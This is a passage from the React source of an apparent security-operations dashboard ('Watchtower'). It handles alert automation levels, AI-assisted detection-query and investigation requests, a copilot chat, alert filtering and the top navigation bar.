          if(webhook) fetch('/api/slack-webhook',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webhook,alert:{title:`[Auto-closed FP] ${a.title}`,severity:a.severity,source:a.source,verdict:'FP',confidence:a.confidence}})}).catch(()=>{});
        }).catch(()=>{});
      });
      // Auto+Notify: also send Slack notification for new high-confidence TPs
      if(automation===1) {
        const tpNotifyCandidates = alerts.filter(a=>a.verdict==='TP'&&['Critical','High'].includes(a.severity)&&a.confidence>=80&&!autoFiredRef.current.has('tp_notify_'+a.id));
        tpNotifyCandidates.forEach(a=>{
          autoFiredRef.current.add('tp_notify_'+a.id);
          fetch('/api/audit',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({type:'auto_notify_tp',alertId:a.id,alertTitle:a.title,confidence:a.confidence,severity:a.severity,automation,analyst:'AI'})}).catch(()=>{});
          fetch('/api/settings/user',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{
            const webhook=d.settings?.slack_webhook;
            if(webhook) fetch('/api/slack-webhook',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webhook,alert:{title:`[⚠ Alert — action required] ${a.title}`,severity:a.severity,source:a.source,verdict:'TP',confidence:a.confidence,message:'Auto+Notify: analyst action required for this True Positive.'}})}).catch(()=>{});
          }).catch(()=>{});
        });
      }
    }
    if(automation===2) {
      // Full Auto: isolate high-confidence Critical/High TPs + disable accounts where applicable
      const tpCandidates = alerts.filter(a=>a.verdict==='TP'&&['Critical','High'].includes(a.severity)&&a.confidence>=80&&!autoFiredRef.current.has('tp_'+a.id));
      tpCandidates.forEach(a=>{
        autoFiredRef.current.add('tp_'+a.id);
        const immediateActions = [];
        if(a.device) immediateActions.push({priority:'CRITICAL',action:`Isolate host ${a.device} from network`,timeframe:'immediately',owner:'SOC L2'});
        if(a.ip) immediateActions.push({priority:'HIGH',action:`Block IP ${a.ip} at perimeter`,timeframe:'within 5 minutes',owner:'SOC L2'});
        if(a.user&&a.verdict==='TP') immediateActions.push({priority:'HIGH',action:`Disable account ${a.user} pending investigation`,timeframe:'within 10 minutes',owner:'SOC L2'});
        immediateActions.push({priority:'HIGH',action:`Create incident ticket for ${a.title}`,timeframe:'within 15 minutes',owner:'SOC L2'});
        fetch('/api/response-actions',{
          method:'POST',
          headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},
          body:JSON.stringify({action:'full_auto_batch',immediateActions,alertId:a.id,alertTitle:a.title,verdict:a.verdict,confidence:a.confidence,device:a.device,ip:a.ip,user:a.user,analyst:'APEX Full Auto'}),
        }).catch(()=>{});
        fetch('/api/audit',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({type:'auto_response_full',alertId:a.id,alertTitle:a.title,automation,analyst:'AI',actionsCount:immediateActions.length})}).catch(()=>{});
      });
    }
  },[alerts.length, automation, demoMode]); // alerts.length (not actedAlerts.length) so it fires when alerts arrive OR automation changes
  const automationBannerText = automation === 0
    ? 'AI is recommending only — all actions require analyst approval.'
    : automation === 1
    ? `AI auto-closed ${actedAlerts.length} high-confidence false positive${actedAlerts.length!==1?'s':''} and notified your team.`
    : `AI acted autonomously on ${actedAlerts.length} alert${actedAlerts.length!==1?'s':''} — ${alerts.filter(a=>a.verdict==='TP'&&a.confidence>=80).length} threats contained, ${alerts.filter(a=>a.verdict==='FP'&&a.confidence>=80).length} FPs suppressed.`;

  const totalAlerts = (!demoMode && liveAlerts.length > 0) ? liveAlerts.length : alerts.length;
  // Hot device map for overview
  const overviewDeviceCounts = {};
  alerts.forEach(a=>{if(a.device&&a.device!=='unknown'){overviewDeviceCounts[a.device]=(overviewDeviceCounts[a.device]||0)+1;}});
  const hotDevices = Object.entries(overviewDeviceCounts).sort((a,b)=>b[1]-a[1]).slice(0,4);
  const hotDevicesMax = hotDevices[0]?.[1]||1;
  // MTTR estimate: acknowledged crits divided by their count gives avg age
  const unackedCritCount = critAlerts.filter(a=>!(alertOverrides[a.id]?.acknowledged)&&!a.acknowledged).length;
  const totalVulns = (!demoMode && liveVulns.length > 0) ? liveVulns.length : vulns.length;
  const openCases = incidents.filter(i=>!deletedIncidents.has(i.id)&&(incidentStatuses[i.id]||i.status)==='Active').length;
  const slaBreaches = incidents.filter(i=>{if(!i.created||(incidentStatuses[i.id]||i.status)!=='Active') return false; const ageMs=Date.now()-new Date(i.created).getTime(); const slaMs=(i.severity==='Critical'?3600:i.severity==='High'?14400:86400)*1000; return ageMs>slaMs;}).length;
  
  // Make demo timestamps feel current
  const DEMO_TIME_OFFSETS = [2,4,6,9,13,18,24,3,7,11];
  // In live mode with customIntel, show ONLY AI-generated items (no demo defaults mixed in)
  // In demo mode, show industry-specific + general default items
  // Industry-specific intel: live AI in live mode, demo items in demo mode
  const industryIntel = !demoMode && customIntel
    ? customIntel
    : (DEMO_INTEL_BY_INDUSTRY[industry] || DEMO_INTEL_BY_INDUSTRY['default']).map((item,idx)=>({...item, time:`${DEMO_TIME_OFFSETS[idx%DEMO_TIME_OFFSETS.length]}h ago`}));
  // General intel: always show demo default items (real threat feeds, not user-specific)
  // marked with accurate time offsets; in live mode label as "background feeds"
  const generalIntelItems = DEMO_INTEL_BY_INDUSTRY['default'].map((item,idx)=>({...item, time:`${DEMO_TIME_OFFSETS[idx%DEMO_TIME_OFFSETS.length]}h ago`}));
  const allIntel = industryIntel; // kept for backward compat with any other uses
  // Tenable news: live API data in live mode, demo fallback in demo mode
  const tenableNewsItems = !demoMode && livetenableNews.length > 0
    ? livetenableNews
    : demoMode ? (DEMO_INTEL_BY_INDUSTRY['tenable_news'] || []) : [];

  async function fetchIntelForIndustry(ind, silent) {
    if (!silent) setIntelLoading(true);
    try {
      const resp = await fetch('/api/intel/industry', { method:'POST', headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current}, body:JSON.stringify({industry:ind}) });
      if (resp.ok) {
        const d = await resp.json();
        if (d.items) {
          // Preserve any items that came from connected threat intel tools (VirusTotal, Recorded Future, etc.)
          // Only replace the AI-generated industry items, not the live tool data
          setCustomIntel(prev => {
            const connectedItems = (prev||[]).filter(i => i.fromConnectedTool);
            const ids = new Set(connectedItems.map(x => x.id));
            const newItems = d.items.filter((x) => !ids.has(x.id));
            return [...connectedItems, ...newItems];
          });
          setIntelFetchedAt(new Date().toISOString());
        }
      }
    } catch(e) {}
    if (!silent) setIntelLoading(false);
    // Also fetch Tenable news for live mode
    try {
      const tnResp = await fetch('/api/intel/tenable-news', {headers:{'x-tenant-id':tenantRef.current}});
      if (tnResp.ok) { const d = await tnResp.json(); if (d.items?.length) setLiveTenableNews(d.items); }
    } catch(e) {}
  }

  async function getVulnAiHelp(vuln, queryType) {
    const loadKey = vuln.id + ':' + queryType;
    setVulnAiLoading(loadKey);
    const prompts = {
      splunk: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Splunk SPL detection queries. Use realistic Splunk index/sourcetype names. Label each: SPLUNK QUERY FOR [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      sentinel: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Microsoft Sentinel KQL detection queries using these tables: SecurityEvent, SigninLogs, AuditLogs, CommonSecurityLog, DeviceEvents. Label each: MICROSOFT SENTINEL KQL: [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      defender: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Microsoft Defender Advanced Hunting KQL queries using these tables: DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, IdentityLogonEvents. Label each: MICROSOFT DEFENDER ADVANCED HUNTING: [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      iocs: 'For ' + vuln.cve + ' (' + vuln.title + '), provide known IOCs and threat indicators. Structure with these ALL-CAPS headers: KNOWN IP ADDRESSES, FILE HASHES, DOMAINS AND URLS, PROCESS INDICATORS, REGISTRY KEYS, MITRE TECHNIQUES. No markdown, plain text only.',
    };
    try {
      const resp = await fetch('/api/copilot', { method:'POST', headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current}, body:JSON.stringify({vulnId:vuln.id,vulnCve:vuln.cve,prompt: prompts[queryType]}) });
      if (resp.ok) {
        const d = await resp.json();
        const text = d.response || d.message || 'AI response unavailable — check your Anthropic API key in the Tools tab.';
        let i = 0;
        const interval = setInterval(()=>{ setVulnAiTexts(prev=>({...prev,[loadKey]:text.slice(0,i)})); i++; if(i>text.length) clearInterval(interval); }, 12);
      } else {
        setVulnAiTexts(prev=>({...prev,[loadKey]:'Request failed — check your Anthropic API key in the Tools tab.'}));
      }
    } catch(e) {
      setVulnAiTexts(prev=>({...prev,[loadKey]:'Request failed — check your Anthropic API key in the Tools tab.'}));
    }
    setVulnAiLoading(null);
  }

  function runInvestigation(inc) {
    if (investLoading.has(inc.id)) return;
    // Clear previous result/error so re-run works
    setInvestResults(prev=>{const n={...prev};delete n[inc.id];return n;});
    setInvestLoading(prev => new Set([...prev, inc.id]));
    const incAlerts = alerts.filter(a => inc.alerts?.includes(a.id));
    fetch('/api/investigate', {
      method:'POST', headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},
      body:JSON.stringify({incidentId:inc.id,title:inc.title,severity:inc.severity,alerts:incAlerts.map(a=>({title:a.title,source:a.source,device:a.device,mitre:a.mitre,verdict:a.verdict,time:a.time})),devices:inc.devices,mitreTactics:inc.mitreTactics,aiSummary:inc.aiSummary}),
    }).then(r=>r.json()).then(d=>{
      if(d.ok&&d.result) {
        setInvestResults(prev=>({...prev,[inc.id]:d.result}));
      } else {
        // Store error so UI can display it
        setInvestResults(prev=>({...prev,[inc.id]:{_error: d.error||'Investigation failed. Check your Anthropic API key in the Tools tab.'}}));
      }
    }).catch(e=>{
      setInvestResults(prev=>({...prev,[inc.id]:{_error:'Network error: '+e.message}}));
    }).finally(()=>{
      setInvestLoading(prev=>{const n=new Set(prev);n.delete(inc.id);return n;});
    });
  }

  function closeIncident(id) {
    setIncidentStatuses(prev=>({...prev,[id]:'Closed'}));
    setSelectedIncident(null);
    fetch('/api/audit',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({type:'incident_status',incidentId:id,status:'Closed',analyst:'Analyst'})}).catch(()=>{});
  }

  async function sendCopilotMessage(msg) {
    if (!msg.trim() || copilotLoading) return;
    const userMsg = {role:'user',text:msg.trim(),ts:new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'})};
    setCopilotMessages(prev=>[...prev,userMsg]);
    setCopilotInput('');
    setCopilotLoading(true);
    // Build live context snapshot for the AI
    const ctx = {
      mode: demoMode ? 'demo' : 'live',
      posture,
      alerts: alerts.slice(0,20).map(a=>({id:a.id,title:a.title,severity:a.severity,source:a.source,device:a.device||'unknown',verdict:a.verdict,confidence:a.confidence,mitre:a.mitre||null,time:a.time})),
      critAlertCount: critAlerts.length,
      vulns: vulns.slice(0,10).map(v=>({id:v.id,title:v.title,cve:v.cve,severity:v.severity,device:v.device,cvss:v.cvss})),
      kevCount: kevVulns.length,
      incidents: incidents.filter(i=>!deletedIncidents.has(i.id)).slice(0,5).map(i=>({id:i.id,title:i.title,severity:i.severity,status:incidentStatuses[i.id]||i.status})),
      coverage: {pct:coveredPct,gaps:gapDevices.length,unmonitoredDevices:gapDevices.slice(0,5).map(d=>d.hostname)},
      tools: Object.keys(connectedTools),
      lastSynced,
    };
    const history = copilotMessages.slice(-6).map(m=>({role:m.role==='user'?'user':'assistant',content:m.text}));
    try {
      const res = await fetch('/api/copilot',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},
        body:JSON.stringify({prompt:msg.trim(), context:ctx, messages:history.length>0?[...history,{role:'user',content:msg.trim()}]:undefined})});
      const d = await res.json();
      setCopilotMessages(prev=>[...prev,{role:'assistant',text:d.response||'Sorry, no response.',ts:new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'})}]);
    } catch {
      setCopilotMessages(prev=>[...prev,{role:'assistant',text:'Connection error — check your API key in Settings.',ts:''}]);
    }
    setCopilotLoading(false);
    setTimeout(()=>copilotBottomRef.current?.scrollIntoView({behavior:'smooth'}),50);
  }

  function toggleAlertExpand(id) {
    setExpandedAlerts(prev => { const n = new Set(prev); n.has(id)?n.delete(id):n.add(id); return n; });
  }

  const TABS = ['overview','alerts','coverage','vulns','intel','incidents','tools','mssp','compliance','sales','admin'];
  const isSales = userRole === 'sales' || isAdmin;
  const isViewer = userRole === 'viewer';
  const isTechAdmin = userRole === 'tech_admin' || isAdmin;

  // ── Alerts tab: derived sort/filter/page vars ──────────────────────────────
  const ALERT_SEV_ORDER = {Critical:0,High:1,Medium:2,Low:3};
  const now_ts = Date.now();
  const alertsFiltered = alerts
    .filter(a=>!(alertSnoozes[a.id] && alertSnoozes[a.id] > now_ts))
    .filter(a=>!alertSearch || a.title.toLowerCase().includes(alertSearch.toLowerCase()) || (a.device||'').toLowerCase().includes(alertSearch.toLowerCase()) || (a.source||'').toLowerCase().includes(alertSearch.toLowerCase()))
    .filter(a=>alertSevFilter==='all' || a.severity===alertSevFilter)
    .filter(a=>alertSrcFilter==='all' || a.source===alertSrcFilter);
  const alertsSorted = alertSort==='time-asc' ? [...alertsFiltered].reverse()
    : alertSort==='sev-desc' ? [...alertsFiltered].sort((a,b)=>(ALERT_SEV_ORDER[a.severity]||4)-(ALERT_SEV_ORDER[b.severity]||4))
    : alertSort==='sev-asc' ? [...alertsFiltered].sort((a,b)=>(ALERT_SEV_ORDER[b.severity]||4)-(ALERT_SEV_ORDER[a.severity]||4))
    : alertSort==='src-asc' ? [...alertsFiltered].sort((a,b)=>a.source.localeCompare(b.source))
    : alertsFiltered;
  const ALERT_PAGE_SIZE = 25;
  const alertTotalPages = Math.ceil(alertsSorted.length / ALERT_PAGE_SIZE);
  const alertPageClamped = Math.min(alertPage, Math.max(0, alertTotalPages-1));
  const alertsPaged = alertsSorted.slice(alertPageClamped*ALERT_PAGE_SIZE, (alertPageClamped+1)*ALERT_PAGE_SIZE);
  // ── End alerts derived vars ────────────────────────────────────────────────

  return (
    <div className={`wt-root${theme === 'light' ? ' light' : ''}`} style={{display:'flex',flexDirection:'column',minHeight:'100vh',maxWidth:'100vw',overflowX:'hidden',background:'var(--wt-bg)',color:'var(--wt-text)',fontFamily:'Inter,sans-serif'}}>
      <style dangerouslySetInnerHTML={{__html:DASHBOARD_CSS}} />
      {/* MAIN — full width, no sidebar */}
      <div style={{display:'flex',flexDirection:'column',overflow:'hidden',flex:1,maxWidth:'100vw'}}>
        {/* Client message banner */}
        {clientBanner && (
          <div style={{display:'flex',alignItems:'center',gap:10,padding:'8px 18px',background:'#f0a03015',borderBottom:'1px solid #f0a03030',flexShrink:0}}>
            <span style={{fontSize:'0.86rem'}}>📢</span>
            <span style={{fontSize:'0.82rem',color:'#f0c070',flex:1,fontWeight:500}}>{clientBanner}</span>
            {!isAdmin && <button onClick={()=>setClientBanner(null)} style={{padding:'2px 8px',borderRadius:5,border:'1px solid #f0a03030',background:'transparent',color:'#f0a030',fontSize:'0.86rem',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Dismiss ×</button>}
          </div>
        )}

        {/* TOP BAR — full-width horizontal nav */}
        <div className="wt-topbar" style={{display:'flex',alignItems:'center',padding:'0 16px',borderBottom:'1px solid #1d2535',background:'var(--wt-sidebar)',flexShrink:0,gap:0,height:48}}>
          {/* Logo + wordmark */}
          <div style={{display:'flex',alignItems:'center',gap:8,paddingRight:16,borderRight:'1px solid #1d2535',marginRight:8,flexShrink:0,height:'100%'}}>
            <svg width="26" height="26" viewBox="0 0 34 34" fill="none">
              <rect width="34" height="34" rx="9" fill="url(#wg2)"/>
              <path d="M17 7L26 11V18C26 22.5 22 26.5 17 28C12 26.5 8 22.5 8 18V11L17 7Z" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.4)" strokeWidth="0.8"/>
              <path d="M14.5 18L16.5 20L20.5 15.5" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              <defs><linearGradient id="wg2" x1="0" y1="0" x2="34" y2="34" gradientUnits="userSpaceOnUse"><stop stopColor="#3b7fff"/><stop offset="1" stopColor="#7c3aff"/></linearGradient></defs>
            </svg>
            <span style={{fontSize:'0.82rem',fontWeight:800,letterSpacing:'-0.3px',color:'var(--wt-text)'}}>Watchtower</span>
          </div>

          {/* Primary tabs — always visible */}
          <div className="wt-tabbar" style={{display:'flex',gap:0,height:'100%',alignItems:'stretch',overflowX:'auto'}}>
            {['overview','alerts','coverage','vulns','intel','incidents','tools'].filter(t=>{
              if (isViewer) return ['overview','alerts','coverage','vulns','intel','incidents'].includes(t);
              return true;
            }).map(t=>(
              <button key={t} onClick={()=>setActiveTab(t)} style={{height:'100%',padding:'0 14px',border:'none',borderBottom:`2px solid ${activeTab===t?'#4f8fff':'transparent'}`,background:'transparent',color:activeTab===t?'#4f8fff':'var(--wt-muted)',fontSize:'0.8rem',fontWeight:activeTab===t?700:500,cursor:'pointer',fontFamily:'Inter,sans-serif',transition:'all .15s',whiteSpace:'nowrap',display:'flex',alignItems:'center',gap:5}}>
                {t==='incidents'?'Cases':t.charAt(0).toUpperCase()+t.slice(1)}
                {t==='alerts'&&critAlerts.length>0&&<span style={{fontSize:'0.58rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f0405e',color:'#fff'}}>{critAlerts.length}</span>}
                {t==='vulns'&&kevVulns.length>0&&<span style={{fontSize:'0.58rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f97316',color:'#fff'}}>{kevVulns.length}</span>}
              </button>
            ))}
          </div>

          {/* Secondary tabs — nested under More */}
          {(()=>{
            const secTabs = [
              ...(isAdmin||userTier==='mssp'?[{t:'mssp',label:'Portfolio',icon:'🏢',color:'#8b6fff'}]:[]),
              ...(isAdmin||canUse('business')?[{t:'compliance',label:'Compliance',icon:'🛡',color:'#8b6fff'}]:[]),
              ...(isSales?[{t:'sales',label:'Sales',icon:'📈',color:'#22d49a'}]:[]),
              ...(isAdmin?[{t:'admin',label:'Admin',icon:'🔧',color:'#f0a030'}]:[]),
            ];
            if (!secTabs.length) return null;
            const activeSecTab = secTabs.find(s=>s.t===activeTab);
            return (
              <div style={{position:'relative',height:'100%',display:'flex',alignItems:'stretch',marginLeft:2}}>
                <button onClick={()=>{const el=document.getElementById('wt-more-menu');if(el)el.style.display=el.style.display==='none'?'flex':'none';}} style={{height:'100%',padding:'0 12px',border:'none',borderBottom:`2px solid ${activeSecTab?'#4f8fff':'transparent'}`,background:'transparent',color:activeSecTab?'#4f8fff':'var(--wt-muted)',fontSize:'0.8rem',fontWeight:activeSecTab?700:500,cursor:'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4,whiteSpace:'nowrap'}}>
                  {activeSecTab?<><span>{activeSecTab.icon}</span>{activeSecTab.label}</>:<>More <span style={{fontSize:'0.84rem'}}>▾</span></>}
                </button>
                <div id='wt-more-menu' style={{display:'none',position:'absolute',top:'100%',left:0,background:'var(--wt-sidebar)',border:'1px solid #1d2535',borderRadius:10,boxShadow:'0 8px 32px rgba(0,0,0,0.5)',zIndex:100,flexDirection:'column',minWidth:160,padding:4,marginTop:2}} onBlur={e=>{if(!e.currentTarget.contains(e.relatedTarget))e.currentTarget.style.display='none';}}>
                  {secTabs.map(({t,label,icon,color})=>(
                    <button key={t} onClick={()=>{setActiveTab(t);const el=document.getElementById('wt-more-menu');if(el)el.style.display='none';}} style={{padding:'8px 14px',border:'none',borderRadius:7,background:activeTab===t?`${color}18`:'transparent',color:activeTab===t?color:'var(--wt-secondary)',fontSize:'0.82rem',fontWeight:activeTab===t?700:500,cursor:'pointer',fontFamily:'Inter,sans-serif',textAlign:'left',display:'flex',alignItems:'center',gap:8,transition:'background .12s'}} onMouseEnter={e=>e.currentTarget.style.background=`${color}10`} onMouseLeave={e=>e.currentTarget.style.background=activeTab===t?`${color}18`:'transparent'}>
                      <span>{icon}</span>{label}
                      {t==='admin'&&<span style={{marginLeft:'auto',width:5,height:5,borderRadius:'50%',background:'#f0a030',boxShadow:'0 0 4px #f0a030',display:'block'}} />}
                    </button>
                  ))}
                </div>
              </div>
            );
          })()}

          {/* Right controls */}
          <div className="wt-topbar-controls-full" style={{marginLeft:'auto',alignItems:'center',gap:8,height:'100%'}}>
            {/* Sync status */}
            <div style={{display:'flex',alignItems:'center',gap:5,fontSize:'0.84rem',color:'var(--wt-muted)',borderRight:'1px solid #1d2535',paddingRight:10,height:'100%'}}>
              {demoMode && <span style={{display:'inline-flex',alignItems:'center',gap:4}}><span style={{width:6,height:6,borderRadius:'50%',background:'#f0a030',display:'block'}} />{tools.filter(t=>t.active).length} tools</span>}
              {!demoMode && syncStatus==='syncing' && <span style={{display:'inline-flex',alignItems:'center',gap:4}}><span style={{width:8,height:8,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}} /><span style={{color:'#4f8fff'}}>Syncing</span></span>}
              {!demoMode && syncStatus==='error' && <span style={{display:'inline-flex',alignItems:'center',gap:4}}><span style={{width:6,height:6,borderRadius:'50%',background:'#f0405e',display:'block'}} /><span style={{color:'#f0405e'}}>Error</span></span>}
              {!demoMode && syncStatus==='ok' && <span style={{display:'inline-flex',alignItems:'center',gap:4}}><span style={{width:6,height:6,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 6px #22c992',display:'block'}} />{tools.filter(t=>t.active).length} live</span>}
              {!demoMode && syncStatus==='idle' && <span style={{display:'inline-flex',alignItems:'center',gap:4}}><span style={{width:6,height:6,borderRadius:'50%',background:'#6b7a94',display:'block'}} />{Object.keys(connectedTools).length}</span>}
              {!demoMode && Object.keys(connectedTools).length>0 && <button onClick={()=>doSync()} disabled={syncStatus==='syncing'} style={{padding:'2px 8px',borderRadius:5,border:'1px solid #4f8fff30',background:'#4f8fff0f',color:'#4f8fff',fontSize:'0.84rem',fontWeight:700,cursor:syncStatus==='syncing'?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',opacity:syncStatus==='syncing'?0.6:1}}>⟳</button>}
            </div>
            {/* Automation */}
            {canUse('team') ? (
              <div style={{display:'flex',alignItems:'center',gap:3,padding:'3px 8px',borderRadius:7,background:'var(--wt-card2)',border:'1px solid #1d2535'}}>
                <span style={{fontSize:'0.82rem',color:'var(--wt-muted)'}}>Auto:</span>
                {(['Rec','Notify','Full']).map((l,i)=>(
                  <button key={l} onClick={()=>{setAutomation(i);fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({automation:String(i)})}).catch(()=>{});}} style={{padding:'2px 6px',borderRadius:4,fontSize:'0.8rem',fontWeight:700,border:'none',cursor:'pointer',background:automation===i?autColor:'transparent',color:automation===i?'#fff':'#6b7a94',fontFamily:'Inter,sans-serif'}}>{l}</button>
                ))}
              </div>
            ) : (
              <a href='/pricing' style={{fontSize:'0.84rem',color:'#4f8fff',fontWeight:700,textDecoration:'none',padding:'3px 8px',borderRadius:6,border:'1px solid #4f8fff20',background:'#4f8fff08'}}>🔒 Upgrade</a>
            )}
            {/* Demo/Live toggle */}
            <button onClick={()=>setDemoMode(d=>{const next=!d;if(typeof window!=='undefined')localStorage.setItem('wt_demo_mode',String(next));fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({demoMode:String(next)})}).catch(()=>{});return next;})} style={{padding:'3px 10px',borderRadius:6,border:`1px solid ${demoMode?'#f0a03030':'#22d49a30'}`,background:demoMode?'#f0a03010':'#22d49a10',color:demoMode?'#f0a030':'#22d49a',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>{demoMode?'DEMO':'LIVE'}</button>
            {/* Admin: tier sim + tenant */}
            {isAdmin&&<select value={userTier} onChange={e=>{setUserTier(e.target.value);fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({userTier:e.target.value})}).catch(()=>{});}} style={{padding:'3px 6px',borderRadius:6,border:'1px solid #8b6fff30',background:'#8b6fff10',color:'#8b6fff',fontSize:'0.82rem',fontWeight:700,fontFamily:'Inter,sans-serif',cursor:'pointer',outline:'none'}}>
              {([['community','Free'],['team','Essentials'],['business','Pro'],['mssp','Enterprise']]).map(([v,l])=><option key={v} value={v}>{l}</option>)}
            </select>}
            {isAdmin&&<select value={currentTenant} onChange={e=>setCurrentTenant(e.target.value)} style={{padding:'3px 6px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'var(--wt-card)',color:'var(--wt-text)',fontSize:'0.84rem',fontFamily:'Inter,sans-serif',cursor:'pointer',outline:'none',maxWidth:120}}>
              {DEMO_TENANTS.map(t=>(<option key={t.id} value={t.id}>{t.type==='client'?'◦ ':''}{t.name}</option>))}
            </select>}
            {/* Utils */}
            {canUse('team')&&<button onClick={()=>setActiveTab('incidents')} style={{padding:'3px 8px',borderRadius:6,border:'1px solid #8b6fff30',background:'#8b6fff0a',color:'#8b6fff',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>⇄ Handover</button>}
            <button onClick={toggleTheme} style={{width:30,height:30,borderRadius:7,border:'1px solid var(--wt-border)',background:'var(--wt-card)',cursor:'pointer',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.85rem',flexShrink:0}}>{theme==='dark'?'☀️':'🌙'}</button>
            <a href='/settings' style={{width:30,height:30,borderRadius:7,border:'1px solid var(--wt-border)',background:'var(--wt-card)',cursor:'pointer',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.82rem',color:'inherit',textDecoration:'none',flexShrink:0}}>⚙️</a>
            {canUse('business')&&<button onClick={()=>setActiveTab('compliance')} style={{padding:'3px 8px',borderRadius:6,border:'1px solid #22d49a30',background:'#22d49a0a',color:'#22d49a',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}} title='CISO Board Report'>📊 CISO</button>}
            <button onClick={async()=>{await fetch('/api/auth/logout',{method:'POST'});window.location.href='/login';}} style={{width:30,height:30,borderRadius:7,border:'1px solid var(--wt-border)',background:'var(--wt-card)',cursor:'pointer',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.8rem',color:'var(--wt-dim)',flexShrink:0}} title='Sign out' aria-label='Sign out'>↩</button>
          </div>
          {/* Mobile: logo + demo toggle only */}
          <div className="wt-topbar-controls-mobile" style={{marginLeft:'auto',alignItems:'center',gap:6}}>
            <button onClick={toggleTheme} style={{width:30,height:30,borderRadius:7,border:'1px solid var(--wt-border)',background:'var(--wt-card)',cursor:'pointer',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.85rem'}}>{theme==='dark'?'☀️':'🌙'}</button>
            <button onClick={()=>setDemoMode(d=>{const next=!d;if(typeof window!=='undefined')localStorage.setItem('wt_demo_mode',String(next));fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({demoMode:String(next)})}).catch(()=>{});return next;})} style={{padding:'3px 8px',borderRadius:6,border:`1px solid ${demoMode?'#f0a03030':'#22d49a30'}`,background:demoMode?'#f0a03010':'#22d49a10',color:demoMode?'#f0a030':'#22d49a',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{demoMode?'DEMO':'LIVE'}</button>
          </div>
        </div>

        {/* CONTENT */}
        <div className="wt-content wt-main" id='main-content' style={{flex:1,overflowY:'auto',overflowX:'hidden',padding:'16px 18px',background:'var(--wt-bg)'}} key={activeTab}>

          {/* LIVE MODE — no data yet banner */}
          {!demoMode && liveAlerts.length === 0 && Object.keys(connectedTools).length > 0 && (
            <div style={{padding:'12px 16px',background:'#4f8fff08',border:'1px solid #4f8fff20',borderRadius:10,marginBottom:14,display:'flex',alignItems:'center',gap:10}}>
              {syncStatus==='syncing' ? <span style={{width:12,height:12,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite',flexShrink:0}} /> : <span style={{fontSize:'0.9rem'}}>📡</span>}
              <div style={{flex:1}}>
                <div style={{fontSize:'0.82rem',fontWeight:700,color:'#4f8fff'}}>{syncStatus==='syncing'?'Fetching live data from connected tools…':'Live mode — awaiting first sync'}</div>
                {syncError && <div style={{fontSize:'0.8rem',color:'#f0405e',marginTop:2}}>{syncError}</div>}
                {!syncError && syncStatus!=='syncing' && <div style={{fontSize:'0.8rem',color:'var(--wt-muted)',marginTop:1}}>Connected: {Object.keys(connectedTools).slice(0,5).join(', ')}{Object.keys(connectedTools).length>5?` +${Object.keys(connectedTools).length-5} more`:''} · Syncs every 60s</div>}
              </div>
              {!syncError && syncStatus!=='syncing' && <button onClick={()=>fetch('/api/integrations/sync',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({integrations:Object.keys(connectedTools).map(id=>({id}))})}).then(r=>r.json()).then(d=>setSyncStatus('ok'))} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.8rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>⟳ Sync now</button>}
            </div>
          )}
          {/* AI key prompt: shown in live mode with tools connected but before AI features used */}
          {!demoMode && Object.keys(connectedTools).length > 0 && canUse('team') && (
